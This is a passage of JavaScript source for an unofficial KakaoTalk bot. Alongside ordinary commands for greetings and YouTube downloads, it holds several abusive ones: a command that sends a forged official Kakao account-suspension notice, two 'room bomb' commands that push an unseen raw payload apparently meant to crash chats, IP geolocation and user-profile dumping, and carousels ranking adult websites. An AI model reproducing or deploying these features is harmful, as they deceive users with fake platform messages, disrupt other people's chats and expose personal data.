              code: "0CrDcJtxWTPrAG8b2S8dp7PhzUMcGrF1MglJiXMQzTE=",
              createdAt: 1614678345558,
            },
          },
          C: {
            CTP: "Feed",
            CIL: [
              {
                BUT: 1,
                TI: { TD: { T: "11위", D: "spankbang.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://spankbang.com",
                      LMO: "https://spankbang.com",
                    },
                    BU: {
                      T: "들어가기",
                    },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/bSFzA7/btqNVRIrkyY/26ZX1Dk3VWQWORKPkbiiTK/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "12위", D: "dmm.co.jp" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: { LPC: "https://dmm.co.jp", LMO: "https://dmm.co.jp" },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/ExBiC/btqNVSAu05x/Y5GjISEgIIGlftzFW6YpK1/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "13위", D: "livejasmin.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://livejasmin.com",
                      LMO: "https://livejasmin.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/er3wb7/btqNWfWyBZJ/nc5dqdElKJysxF9LQlGGxK/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "14위", D: "xhamsterlive.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://xhamsterlive.com",
                      LMO: "https://xhamsterlive.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/yI5UK/btqNXeJCIc4/Fbf9MnBFL1NnXcYYiHzbUk/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "15위", D: "xvideos3.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://xvideos3.com",
                      LMO: "https://xvideos3.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/bExDVn/btqNVRO8iiN/oAbUXVY13hkuz2q761ImsK/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "16위", D: "xnxx.es" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: { LPC: "https://xnxx.es", LMO: "https://xnxx.es" },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/0vbyx/btqNVCdEjuB/Itdp5cVKwWb2AaVblkISK0/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "17위", D: "pornhubpremium.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://pornhubpremium.com",
                      LMO: "https://pornhubpremium.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/cRlPpG/btqNSAm7rU8/vodqk0QRmgPOfnOwr58ds1/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "18위", D: "onlyfans.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://onlyfans.com",
                      LMO: "https://onlyfans.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/FhCmO/btqNXcLO8tZ/okimbJy1bSeik6G1RrM1wk/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "19위", D: "xvideos-cdn.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://xvideos-cdn.com",
                      LMO: "https://xvideos-cdn.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/X1kbA/btqNSzuVuHu/1gV1rZeWBolqHpjiHJ5p60/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "20위", D: "rule34.xxx" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: { LPC: "https://rule34.xxx", LMO: "https://rule34.xxx" },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/bUFfIv/btqNVR2FQrT/QVpsTHyHpLhgJYagG6Za8K/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
            ],
          },
          bot: "b",
          bot_msg_ttl: 1095,
        });
        client.chatManager.sendRaw(chat.channel, 71, "성인랭킹", {
          P: {
            ME: "카카오톡 봇",
            LOCK: false,
            AD: false,
            DID: "/bot/5fb551c2d9431d64aa843571/intent/5fb6a0bd2cb6e55d5b67dd06",
            VW: "2.6.1",
            FW: false,
            TP: "Carousel",
            VM: "2.3.5",
            SID: "plusfriend_bot",
            VI: "6.4.5",
            VA: "6.4.5",
            A: {
              version: 1,
              code: "EbJQobO6qcDvzIg2Rucs+I9XqmZCZhB99H59YH/jDWw=",
              createdAt: 1614678345576,
            },
          },
          C: {
            CTP: "Feed",
            CIL: [
              {
                BUT: 1,
                TI: { TD: { T: "21위", D: "stripchat.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://stripchat.com",
                      LMO: "https://stripchat.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/JNg7h/btqNSzBH5pR/YdH1XmIfBsV4sTz8ieRKx1/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "22위", D: "jerkmate.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://jerkmate.com",
                      LMO: "https://jerkmate.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/bETh0i/btqNXdKIje0/CQXOAkYb5kamxijgwEgygk/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "23위", D: "xvideos.es" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: { LPC: "https://xvideos.es", LMO: "https://xvideos.es" },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/qB2iE/btqNSzuVvhi/OCCTo6ClTTE47kgkM6z6FK/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "24위", D: "visitstats.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://visitstats.com",
                      LMO: "https://visitstats.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/bacI8e/btqNSAm71UC/nMuy8GrQq0MDv4ZoULG5r0/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "25위", D: "daftsex.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://daftsex.com",
                      LMO: "https://daftsex.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/bfh5xW/btqNSyvZGPk/AyJkeMNCmvrT5RrDResKH1/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "26위", D: "iporntv.net" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://iporntv.net",
                      LMO: "https://iporntv.net",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/IMbOt/btqNSzaFxLP/0v0Z8rWr9KOz5Tmeo67Kd1/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "27위", D: "e-hentai.org" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://e-hentai.org",
                      LMO: "https://e-hentai.org",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/AEPjJ/btqNXGy7Y0j/8s2YCwF4BSFUfjDJSIuzzk/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "28위", D: "cityheaven.net" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://cityheaven.net",
                      LMO: "https://cityheaven.net",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/b2TnAy/btqNVSmZK4y/0yuVXL4d1VOqFxb0Rvuev0/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "29위", D: "ixxx.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: { LPC: "https://ixxx.com", LMO: "https://ixxx.com" },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/cr8jQu/btqNRKcpVOi/x2ZloRW0HkIv3c2OBZkuc0/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
              {
                BUT: 1,
                TI: { TD: { T: "30위", D: "youjizz.com" }, FT: false },
                THC: 1,
                BUL: [
                  {
                    L: {
                      LPC: "https://youjizz.com",
                      LMO: "https://youjizz.com",
                    },
                    BU: { T: "들어가기" },
                  },
                ],
                L: {},
                THL: [
                  {
                    TH: {
                      THU: "http://k.kakaocdn.net/dn/Pst2n/btqNWDJF1j3/o6ueikk1CWsCuC2eDYSNw0/2x1.jpg",
                      W: 800,
                      H: 400,
                    },
                  },
                ],
              },
            ],
          },
          bot: "b",
          bot_msg_ttl: 1095,
        });
        /* client.chatManager.sendRaw(chat.channel, 71, '성인랭킹', {"P":{"ME":"카카오톡 봇","LOCK":false,"AD":false,"DID":"/bot/5fb551c2d9431d64aa843571/intent/5fb6a0bd2cb6e55d5b67dd06","VW":"2.6.1","FW":false,"TP":"Carousel","VM":"2.3.5","SID":"plusfriend_bot","VI":"6.4.5","VA":"6.4.5","A":{"version":1,"code":"3QlQybIL3wuj9mHzTzGQAv7JtY4qx9X/1NXsMJ2AIGk=","createdAt":1617924985871}},"C":{"CTP":"Feed","CIL":[{"BUT":1,"TI":{"TD":{"T":"21위","D":"stripchat.com"},"FT":false},"THC":1,"BUL":[{"L":{"LPC":"https://stripchat.com","LMO":"https://stripchat.com"},"BU":{"T":"들어가기"}}],"L":{},"THL":[{"TH":{"THU":"http://k.kakaocdn.net/dn/JNg7h/btqNSzBH5pR/YdH1XmIfBsV4sTz8ieRKx1/2x1.jpg","W":800,"H":400}}]},{"BUT":1,"TI":{"TD":{"T":"22위","D":"jerkmate.com"},"FT":false},"THC":1,"BUL":[{"L":{"LPC":"https://jerkmate.com","LMO":"https://jerkmate.com"},"BU":{"T":"들어가기"}}],"L":{},"THL":[{"TH":{"THU":"http://k.kakaocdn.net/dn/bETh0i/btqNXdKIje0/CQXOAkYb5kamxijgwEgygk/2x1.jpg","W":800,"H":400}}]},{"BUT":1,"TI":{"TD":{"T":"23위","D":"xvideos.es"},"FT":false},"THC":1,"BUL":[{"L":{"LPC":"https://xvideos.es","LMO":"https://xvideos.es"},"BU":{"T":"들어가기"}}],"L":{},"THL":[{"TH":{"THU":"http://k.kakaocdn.net/dn/qB2iE/btqNSzuVvhi/OCCTo6ClTTE47kgkM6z6FK/2x1.jpg","W":800,"H":400}}]},{"BUT":1,"TI":{"TD":{"T":"24위","D":"visitstats.com"},"FT":false},"THC":1,"BUL":[{"L":{"LPC":"https://visitstats.com","LMO":"https://visitstats.com"},"BU":{"T":"들어가기"}}],"L":{},"THL":[{"TH":{"THU":"http://k.kakaocdn.net/dn/bacI8e/btqNSAm71UC/nMuy8GrQq0MDv4ZoULG5r0/2x1.jpg","W":800,"H":400}}]},{"BUT":1,"TI":{"TD":{"T":"25위","D":"daftsex.com"},"FT":false},"THC":1,"BUL":[{"L":{"LPC":"https://daftsex.com","LMO":"https://daftsex.com"},"BU":{"T":" 들어가기"}}],"L":{},"THL":[{"TH":{"THU":"http://k.kakaocdn.net/dn/bfh5xW/btqNSyvZGPk/AyJkeMNCmvrT5RrDResKH1/2x1.jpg","W":800,"H":400}}]},{"BUT":1,"TI":{"TD":{"T":"26위","D":"iporntv.net"},"FT":false},"THC":1,"BUL":[{"L":{"LPC":"https://iporntv.net","LMO":"https://iporntv.net"},"BU":{"T":"들어가기"}}],"L":{},"THL":[{"TH":{"THU":"http://k.kakaocdn.net/dn/IMbOt/btqNSzaFxLP/0v0Z8rWr9KOz5Tmeo67Kd1/2x1.jpg...
         */
      }

      if (Text == ".정지") {
        client.chatManager.sendRaw(chat.channel, 71, "Custom", {
          C: {
            TI: {
              FT: true,
              TD: {
                T: "카카오톡 이용제한 안내",
                D: "제한내용: \n오픈채팅 이용제한 14일\n제한사유: \n운영정책 위반\n해제일시: \n2021/05/16(일) 00시 이후(한국표준시/KST)\n\n임시조치 기간동안 다른 카카오톡 서비스는 이용 가능하나 오픈채팅 이용 재개는 불가하며, 카카오톡 인증/가입 및 탈퇴에도 제한이 있습니다. \n이 기간 중 임의로 탈퇴를 하는 경우 재가입 불가기간이 7일 더 추가됩니다.\n운영정책 위반행위가 반복되거나 다른 이용제한 사유가 발견되는 경우 이용제한 조치가 가중되거나 영구적으로 이용이 제한될 수 있습니다.\n이용제한에 대한 고객센터 문의절차 확인 및 운영정책에 대한 자세한 내용은 아래의 운영정책을 확인해 주세요.",
              },
            },
            BUL: [
              {
                BU: {
                  T: "운영정책 확인하기",
                },
                L: {
                  LCA: "http://www.kakao.com/policy/oppolicy",
                  LCI: "http://www.kakao.com/policy/oppolicy",
                  LMO: "http://www.kakao.com/policy/oppolicy",
                  LPC: "http://www.kakao.com/policy/oppolicy",
                },
              },
            ],
            BUT: 0,
          },
          P: {
            TP: "Feed",
            ME: "카카오톡 이용제한 안내",
            SID: "plusfriend_tms",
            DID: "http://api.tms.kakao.com/messages/69757625",
            FW: true,
            A: {
              version: 1,
              code: "cmqXIyzgwapQvnutCXwyhbmHF3WNcYTob6nuN16Dz+0=",
              createdAt: 1619880621572,
            },
            RF: "chat_ln",
          },
        });
      }
      var a = " ";
      var key_1 = crypto_1.default
        .randomBytes(5)
        .toString("base64")
        .replace("/", "");
      var key = key_1.replace(a.trim(), "");
      var file = key + ".m4a";
      if (Text == ".섭끄기") {
        chat.replyText("[ ! ] 모든 서버를 종료합니다");
        http.close();
      }
      if (Text == ".AI자동학습") {
        chat.replyText("[ ! ] AI가 자동학습을 시작합니다");
        atst = true;
      }
      if (Text == ".AI꺼져") {
        atst = false;
        chat.replyText("[ ! ] AI 자동학습을 중단합니다");
      }
      if (Text.indexOf(".파일") == 0) {
        let a = Text.substring(4);
        fs.writeFile("whatthe.html", a, (err2) => {
          if (err2) throw err2;
        });
        chat.replyText("[ ! ] html 파일 저장 완료!");
      }
      if (chat.Text && chat.Text.startsWith("!로그 ")) {
        if (chatLog[roomId].length == 0)
          return chat.replyText("저장된 로그가 없어요.");
        if (isNaN(chat.Text.slice(4)))
          return chat.replyText("숫자만 입력해주세요.");
        if (chatLog[roomId].length < Number(chat.Text.slice(4)))
          return chat.replyText("저장된 로그 갯수가 부족합니다.");
        sendWhole(
          "채팅 로그",
          chatLog[roomId]
            .slice(-Number(chat.Text.slice(4)))
            .reverse()
            .map((e) => JSON.stringify(e))
            .join("\n════════════════\n")
        );
      }
      if (chat.Text && chat.Text == "!밑메" && chat.Type == 26) {
        if (chatLog[roomId].length == 0)
          return chat.replyText("저장된 로그가 없어요.");
        let ISO = chatLog[roomId].findIndex(
          (e) => e["로그ID"] == Number(chat.rawAttachment.src_logId)
        );
        if (ISO < 0 || !chatLog[roomId][ISO + 1])
          return chat.replyText("저장된 해당 채팅의 밑메가 없어요.");
        sendWhole("밑메", chatLog[roomId][ISO + 1]);
      }
      if (chat.Text && chat.Text == "!윗메" && chat.Type == 26) {
        if (chatLog[roomId].length == 0)
          return chat.replyText("저장된 로그가 없어요.");
        let ISO = chatLog[roomId].findIndex(
          (e) => e["로그ID"] == Number(chat.rawAttachment.src_logId)
        );
        if (ISO < 0 || !chatLog[roomId][ISO - 1])
          return chat.replyText("저장된 해당 채팅의 윗메가 없어요.");
        sendWhole("윗메", chatLog[roomId][ISO - 1]);
      }
      require("fs").writeFileSync(__path, JSON.stringify(chatLog));
      function sendWhole(txt1, txt2) {
        return client.ChatManager.mediaManager.sendMedia(
          { Id: chat.channel.id },
          {
            type: node_kakao_1.ChatType.Text,
            data: Buffer.from(
              txt1 + "\u200b".repeat(500) + "\n\n" + JSON.stringify(txt2)
            ),
          }
        );
      }
      if (Text == "ㅎㅇ" || Text == "안녕하세요" || Text == "안녕하세여") {
        client.chatManager.sendRaw(chat.channel, 98, "Custom", {
          os: [
            {
              t: 1,
              ct: "",
              jct: "[BOT] 인사 메시지",
            },
            {
              t: 4,
              ct: '{"name":"(이모티콘)","path":"4414592.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
            },
            {
              t: 7,
              tt: userInfo.Nickname + "님 안녕하세요!",
            },
          ],
        });
      }
      if (Text == "심심하다" || Text == "심심하당" || Text == "심심해") {
        client.chatManager.sendRaw(chat.channel, 98, "Custom", {
          os: [
            {
              t: 1,
              ct: "",
              jct: "[BOT] 메시지",
            },
            {
              t: 4,
              ct: '{"name":"(이모티콘)","path":"4414592.emot_020.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
            },
            {
              t: 7,
              tt: "으엉",
            },
          ],
        });
      }
      if (Text == ".서버") {
        try {
          app.get("/", function (req, res) {
            //2
            res.sendFile(__dirname + "/whatthe.html");
          });
          http.listen(9999, function () {
            //4
            chat.replyText("server on!");
            chat.replyText("server link: http://192.168.219.107:9999/");
          });
        } catch {
          chat.replyText("server is already on!");
        }
      }
      if (Text.indexOf(".mp") == 0) {
        var id_2 = Text.substr(4);
        var id = id_2.replace("https://youtu.be/watch?v=", "");
        ytdl.getInfo(id).then((info) => {
          let audioAttach = {
            d: info.videoDetails.lengthSeconds,
          };
          chat.replyText(
            "[ ! ] Title: ",
            info.videoDetails.title,
            "\n",
            "[ ! ] Rating: ",
            String(info.player_response.videoDetails.averageRating),
            "\n",
            "[ ! ] Uploaded by: ",
            info.videoDetails.author.name,
            "\n",
            "[ ! ] Video Length: ",
            audioAttach.d
          );
          if (audioAttach.d > 1800) {
            chat.replyText("[ ! ] 파일 크기가 너무 커 다운로드를 중단합니다");
          } else {
            ytdl(id_2).pipe(fs.createWriteStream("audio.m4a"));
            chat.replyText("[ ! ] 다운로드를 완료하였습니다!");
          }
          const json = JSON.stringify(info, null, 2)
            // eslint-disable-next-line max-len
            .replace(
              /(ip(?:=|%3D|\/))((?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)|[0-9a-f]{1,4}(?:(?::|%3A)[0-9a-f]{1,4}){7})/gi,
              "$10.0.0.0"
            );
          fs.writeFile(filepath, json, (err2) => {
            if (err2) throw err2;
          });
        });
      }
      function replaceAll(str, searchStr, replaceStr) {
        return str.split(searchStr).join(replaceStr);
      }
      if (Text.startsWith(".자동엔터")) {
        var a = Text.substr(6);
        var resu = a.replace(/\n/gi, "\\n");
        chat.replyText(resu);
      }
      if (Text == ".패드립on") {
        bannroom = true;
        chat.replyText("[ ! ] 패드립 시 자동강퇴 됩니다");
        const idx = padd.indexOf(chat.Channel.Id);
        if (idx > -1) padd.splice(idx, 1);
      }
      if (Text == ".패드립off") {
        bannroom = false;
        chat.replyText("[ ! ] 패드립 감지가 꺼졌습니다");
        padd.push(chat.Channel.Id);
      }
      if (Text.indexOf(".yt") == 0) {
        var videos_1 = Text.substr(4);
        ytSearch(videos_1, function (err, r) {
          if (err) chat.replyText(String(err));

          const videos = r.videos;
          const playlists = r.playlists;
          const accounts = r.accounts;

          const firstResult = videos[0];
          var title = firstResult.title.toString();
          var id = firstResult.videoId.toString();
          var image = firstResult.thumbnail.toString();
          var time = firstResult.timestamp.toString();
          var url = firstResult.url.toString();
          var channel = firstResult.author.name.toString();
          var view = firstResult.views.toString();
          ytdl.getInfo(id).then((info) => {
            let audioAttach = {
              d: info.videoDetails.lengthSeconds,
            };
            client.chatManager.sendRaw(chat.channel, 23, "Search", {
              L: url,
              Q: title,
              V: "image",
              R: [
                {
                  D: title,
                  L: url,
                  I: image,
                  W: 1280,
                  H: 720,
                },
              ],
            });
            chat.replyText(
              "[ ! ] 제목: ",
              title,
              "\n",
              "[ ! ] 조회수: ",
              view,
              "\n",
              "[ ! ] 채널명: ",
              channel,
              "\n",
              "[ ! ] 영상길이: ",
              time
            );
            if (audioAttach.d > 1800) {
              chat.replyText("[ ! ] 파일 크기가 너무 커 다운로드를 중단합니다");
            } else {
              ytdl(id).pipe(fs.createWriteStream("audio2.m4a"));
            }
            const json = JSON.stringify(info, null, 2)
              // eslint-disable-next-line max-len
              .replace(
                /(ip(?:=|%3D|\/))((?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)|[0-9a-f]{1,4}(?:(?::|%3A)[0-9a-f]{1,4}){7})/gi,
                "$10.0.0.0"
              );
            fs.writeFile(filepath, json, (err2) => {
              if (err2) throw err2;
            });
          });
        });
      }
      if (Text == ".ysend") {
        chat.replyText("[ ! ] 전송 중..");
        try {
          chat.channel.sendMedia({
            type: node_kakao_1.ChatType.Audio,
            name: file,
            data: fs.readFileSync("audio2.m4a"),
            ext: "m4a",
          });
        } catch {
          chat.replyText("[ ! ] 저장된 영상이 없습니다");
        }
      }
      if (Text.indexOf(".vid") == 0) {
        var id_2 = Text.substr(5);
        var id = id_2.replace("https://youtu.be/watch?v=", "");
        ytdl.getInfo(id).then((info) => {
          let audioAttach = {
            d: info.videoDetails.lengthSeconds,
          };
          chat.replyText(
            "[ ! ] Title: ",
            info.videoDetails.title,
            "\n",
            "[ ! ] Rating: ",
            String(info.player_response.videoDetails.averageRating),
            "\n",
            "[ ! ] Uploaded by: ",
            info.videoDetails.author.name,
            "\n",
            "[ ! ] Video Length: ",
            audioAttach.d
          );
          if (audioAttach.d > 1800) {
            chat.replyText("[ ! ] 파일 크기가 너무 커 다운로드를 중단합니다");
          } else {
            ytdl(id_2).pipe(fs.createWriteStream("video.mp4"));
            chat.replyText("[ ! ] 다운로드를 완료하였습니다!");
          }
          const json = JSON.stringify(info, null, 2)
            // eslint-disable-next-line max-len
            .replace(
              /(ip(?:=|%3D|\/))((?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)|[0-9a-f]{1,4}(?:(?::|%3A)[0-9a-f]{1,4}){7})/gi,
              "$10.0.0.0"
            );
          fs.writeFile(filepath, json, (err2) => {
            if (err2) throw err2;
          });
        });
      }
      if (Text == ".mp3") {
        try {
          chat.channel.sendMedia({
            type: node_kakao_1.ChatType.Audio,
            name: file,
            data: fs.readFileSync("audio.m4a"),
            ext: "m4a",
          });

          chat.replyText("[ ! ] 전송 중..");
        } catch {
          chat.replyText("[ ! ] 저장된 영상이 없습니다");
        }
      }
      if (Text == ".vid3") {
        try {
          chat.channel.sendMedia({
            type: node_kakao_1.ChatType.Video,
            name: `${key}.mp4`,
            data: fs.readFileSync("video.mp4"),
            ext: "mp4",
          });
          chat.replyText("[ ! ] 전송 중..");
        } catch {
          chat.replyText("[ ! ] 저장된 영상이 없습니다");
        }
      }
      if (Text == ".vid2") {
        try {
          chat.channel.sendMedia({
            type: node_kakao_1.ChatType.File,
            name: `${key}.mp4`,
            data: fs.readFileSync("video.mp4"),
            ext: "mp4",
          });
          chat.replyText("[ ! ] 전송 중..");
        } catch {
          chat.replyText("[ ! ] 저장된 영상이 없습니다");
        }
      }
      if (Text == ".mp2") {
        try {
          chat.channel.sendMedia({
            type: node_kakao_1.ChatType.File,
            name: file,
            data: fs.readFileSync("audio.m4a"),
            ext: "m4a",
          });

          chat.replyText("[ ! ] 전송 중..");
        } catch {
          chat.replyText("[ ! ] 저장된 영상이 없습니다");
        }
      }
      if (Text == ".폰방폭2") {
        client.chatManager.sendRaw(chat.channel, 98, "Unknown", bangpok);
      }
      if (Text == ".단톡방폭") {
        client.chatManager.sendRaw(chat.channel, 24, "what", bangpok);
      }
      if (Text.startsWith(".채팅")) {
        var channel = client.ChannelManger.get(Text.split(" ")[1]);
        channel.sendText(Text.split(" ")[2]);
      }
      if (Text.startsWith(".아이피")) {
        var ip = Text.substr(5);
        ipinfo(ip, (err, inf) => {
          var info = err || inf;
          var ip = info.ip;
          var city = info.city;
          var region = info.region;
          var country = info.country;
          var loc = info.loc;
          var org = info.org;
          var postal = info.postal;
          var timezone = info.timezone;
          chat.replyText(
            `${ip}의 정보입니다${allsee_1}\nIP: ${ip}\nCITY: ${city}\nREGION: ${region}\nCOUNTRY: ${country}\nLOCATION: ${loc}\nORG: ${org}\nPOSTAL: ${postal}\nTIMEZONE: ${timezone}`
          );
          client.chatManager.sendRaw(chat.channel, 16, "map", {
            lat: loc.split(",")[0],
            lng: loc.split(",")[1],
            a: Text.substr(5) + "의 위치정보",
          });
        });
      }
      if (chat.Text == ".로그" && chat.Type == 26) {
        var chlog = "";
        client.ChatManager.getChatListFrom(
          chat.channel.id,
          chat.attachmentList[0].SourceLogId
        ).then((r) => {
          if (r.result) {
            r.result.forEach((v, i) => {
              chlog +=
                "보낸사람: " +
                v.channel.getUserInfo(v.sender).Nickname +
                "\n" +
                "보낸사람 아이디: " +
                v.sender.id +
                "\n" +
                "보낸 시간; " +
                new Date(v.sendTime * 1000) +
                "\n" +
                "메세지 타입: " +
                node_kakao_1.ChatType[v.Type] +
                "\n" +
                "Attachment(raw): " +
                JSON.stringify(v.rawAttachment, null, 3) +
                "\n" +
                "메세지: " +
                v.Text +
                "\n --------------------------------------- \n";
            });
            chat.replyText("Result: \n" + "\u200b".repeat(500) + chlog);
            console.log("Result: \n" + "\u200b".repeat(500) + chlog);
          }
        });
      }
      if (chat.Text == ".가리기2" && chat.Type == 26) {
        var chlog = "";
        client.ChatManager.getChatListFrom(
          chat.channel.id,
          chat.attachmentList[0].SourceLogId
        ).then((r) => {
          if (r.result) {
            r.result.forEach((v, i) => {
              chat.Channel.hideChatId(v.rawAttachment.src_logId);
              pausecomp(300);
            });
          }
        });
      }
      if (Text.startsWith(".답장 ")) {
        for (i = 0; i < Text.slice(5).length; i++) {
          chat.Channel.sendTemplate(
            new node_kakao_1.AttachmentTemplate(
              new node_kakao_1.ReplyAttachment(
                "1",
                chat.LogId,
                id,
                false,
                Text.slice(i + 4, i + 5)
              ),
              Text.slice(i + 5, i + 6)
            )
          );
          pausecomp(300);
        }
      } //!답장 (할말)
      function replyment(chat, id, repmsg, msg) {
        chat.Channel.sendTemplate(
          new node_kakao_1.AttachmentTemplate(
            new node_kakao_1.ReplyAttachment(
              "1",
              chat.LogId,
              id,
              false,
              repmsg
            ),
            msg
          )
        );
      }
      if (Text.startsWith("/답장") && mentionList.length > 0) {
        var rrr = Text.split("/답장/")[1].split("|")[0];
        var mmm = Text.split("|")[1].split("/")[0];
        replyment(chat, mentionList[0].UserId, rrr, mmm);
      } //  /답장/(반응할말)|(할말)/@멘션
      if (Text.startsWith(".유저정보 ") && mentionList.length > 0) {
        chat.replyText(
          `${allsee_1}[ ! ] 닉네임: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).Nickname
          )}${allsee_1}\n\n클라이언트: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).Client
          )}\n\n아이디: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).Id
          )}\n\n이미지: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).ProfileImageURL
          )}\n\n풀이미지: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId)
              .FullProfileImageURL
          )}\n\n오리지널이미지: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId)
              .OriginalProfileImageURL
          )}\n\n어카운트아이디: ${String(
            chat.Channel.getUserInfoId(mentionList[0].UserId).AccountId
          )}\n\n오픈유저: ${String(
